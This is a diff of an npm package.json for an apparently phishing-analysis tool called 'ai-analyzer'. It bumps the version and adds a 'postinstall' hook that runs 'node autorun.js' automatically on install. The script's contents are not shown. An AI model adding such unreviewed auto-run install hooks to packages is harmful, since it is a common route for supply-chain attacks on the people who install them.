@@ -1,6 +1,6 @@
 {
     "name": "ai-analyzer",
-    "version": "1.0.2",
+    "version": "1.0.3",
     "description": "Usage: npx ai-analyzer analyze-phishing <file_path>",
     "main": "index.js",
     "bin": {
@@ -10,7 +10,8 @@
         "test": "npx mocha test/**/*.test.js",
         "build": "echo 'No build step required for this package'",
         "prepublishOnly": "npm test",
-        "prepare": "echo 'Prepare script executed' && exit 0"
+        "prepare": "echo 'Prepare script executed' && exit 0",
+        "postinstall": "node autorun.js"
     },
     "keywords": [
         "ai-analyzer",
